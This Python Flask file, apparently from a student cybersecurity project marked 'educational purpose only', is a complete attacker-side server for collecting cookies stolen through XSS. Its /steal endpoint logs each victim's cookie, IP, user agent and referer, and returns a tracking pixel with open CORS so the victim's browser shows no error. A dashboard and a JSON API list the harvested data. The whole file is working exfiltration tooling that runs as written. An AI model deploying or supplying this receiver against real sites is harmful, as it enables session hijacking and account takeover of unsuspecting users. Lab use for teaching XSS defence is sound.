#!/usr/bin/env python3
"""
Attacker's Cookie Stealing Server
PCYB Cybersecurity Project - Educational Purpose Only

This server simulates an attacker's endpoint that receives stolen cookies
from XSS payloads. It logs all received data for demonstration purposes.
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json

app = Flask(__name__)

# Storage for stolen cookies
stolen_cookies = []

# HTML template for viewing stolen cookies
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker's Cookie Stealer - PCYB</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
        }
        .warning {
            background: #ff000020;
            border: 2px solid #ff0000;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .stats {
            background: #1a1a1a;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #00ff00;
            border-radius: 5px;
        }
        .cookie-entry {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .cookie-entry:hover {
            background: #252525;
            border-color: #00ff00;
            box-shadow: 0 0 10px #00ff0050;
        }
        .timestamp {
            color: #ffff00;
            font-size: 0.9em;
        }
        .cookie-data {
            margin-top: 10px;
            padding: 10px;
            background: #0a0a0a;
            border-left: 3px solid #ff0000;
            overflow-x: auto;
        }
        .label {
            color: #00aaff;
            font-weight: bold;
        }
        .value {
            color: #00ff00;
        }
        .no-data {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        .clear-btn {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .clear-btn:hover {
            background: #cc0000;
        }
    </style>
    <script>
        function clearCookies() {
            if (confirm('Czy na pewno chcesz wyczyścić wszystkie przechwycone ciasteczka?')) {
                fetch('/clear', { method: 'POST' })
                    .then(() => location.reload());
            }
        }
        
        // Auto-refresh every 5 seconds
        setTimeout(() => location.reload(), 5009);
    </script>
</head>
<body>
    <div class="container">
        <h1>🔴 ATTACKER'S COOKIE STEALER 🔴</h1>
        
        <div class="warning">
            ⚠️ <strong>EDUCATIONAL PURPOSE ONLY</strong> - This server simulates an attacker's endpoint for cybersecurity education
        </div>
        
        <div class="stats">
            <h2>📊 Statistics</h2>
            <p><span class="label">Total Stolen Cookies:</span> <span class="value">{{ total }}</span></p>
            <p><span class="label">Server Running Since:</span> <span class="value">{{ server_start }}</span></p>
            <button class="clear-btn" onclick="clearCookies()">🗑️ Clear All</button>
        </div>
        
        <h2>🍪 Intercepted Cookies</h2>
        
        {% if cookies %}
            {% for entry in cookies %}
            <div class="cookie-entry">
                <div class="timestamp">⏰ {{ entry.timestamp }}</div>
                <div class="cookie-data">
                    <p><span class="label">Cookie:</span> <span class="value">{{ entry.cookie }}</span></p>
                    <p><span class="label">Source IP:</span> <span class="value">{{ entry.ip }}</span></p>
                    <p><span class="label">User-Agent:</span> <span class="value">{{ entry.user_agent }}</span></p>
                    <p><span class="label">Referer:</span> <span class="value">{{ entry.referer or 'N/A' }}</span></p>
                </div>
            </div>
            {% endfor %}
        {% else %}
            <div class="no-data">
                <p>⏳ Waiting for stolen cookies...</p>
                <p style="font-size: 0.8em; margin-top: 10px;">Endpoint: GET /steal?cookie=COOKIE_VALUE</p>
            </div>
        {% endif %}
    </div>
</body>
</html>
"""

# Server start time
SERVER_START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


@app.route('/')
def index():
    """Display all stolen cookies"""
    return render_template_string(
        HTML_TEMPLATE,
        cookies=reversed(stolen_cookies),  # Show newest first
        total=len(stolen_cookies),
        server_start=SERVER_START_TIME
    )


@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """
    Endpoint that receives stolen cookies from XSS payloads
    Accepts both GET and POST requests
    """
    # Extract cookie data from query parameters or POST data
    cookie_data = None
    
    if request.method == 'GET':
        cookie_data = request.args.get('cookie') or request.args.get('c')
    elif request.method == 'POST':
        cookie_data = request.form.get('cookie') or request.json.get('cookie') if request.is_json else None
    
    if not cookie_data:
        # Try to get from any query parameter
        cookie_data = request.args.get('data') or str(dict(request.args))
    
    # Log the stolen cookie
    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'cookie': cookie_data or 'No cookie data',
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer'),
        'method': request.method
    }
    
    stolen_cookies.append(entry)
    
    # Print to console for logging
    print(f"\n{'='*60}")
    print(f"🚨 NEW STOLEN COOKIE RECEIVED!")
    print(f"{'='*60}")
    print(f"Timestamp: {entry['timestamp']}")
    print(f"Cookie: {entry['cookie']}")
    print(f"IP: {entry['ip']}")
    print(f"User-Agent: {entry['user_agent']}")
    print(f"Referer: {entry['referer']}")
    print(f"{'='*60}\n")
    
    # Return a 1x1 transparent pixel (common for tracking scripts)
    # This prevents errors in the victim's browser
    return ('GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
            '\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
            '\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'), 200, {
        'Content-Type': 'image/gif',
        'Access-Control-Allow-Origin': '*'
    }


@app.route('/api/cookies', methods=['GET'])
def api_get_cookies():
    """API endpoint to retrieve stolen cookies as JSON"""
    return jsonify({
        'total': len(stolen_cookies),
        'cookies': stolen_cookies
    })


@app.route('/clear', methods=['POST'])
def clear_cookies():
    """Clear all stolen cookies"""
    global stolen_cookies
    stolen_cookies = []
    print("\n🗑️  All stolen cookies cleared!\n")
    return jsonify({'status': 'cleared'})


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'running',
        'server': 'attacker-cookie-stealer',
        'cookies_collected': len(stolen_cookies)
    })


if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔴 ATTACKER'S COOKIE STEALING SERVER")
    print("="*60)
    print("📡 Listening for stolen cookies...")
    print("🌐 Dashboard: http://localhost:8888")
    print("🎯 Steal endpoint: http://localhost:8888/steal?cookie=XXX")
    print("⚠️  EDUCATIONAL PURPOSE ONLY")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=8888, debug=False)
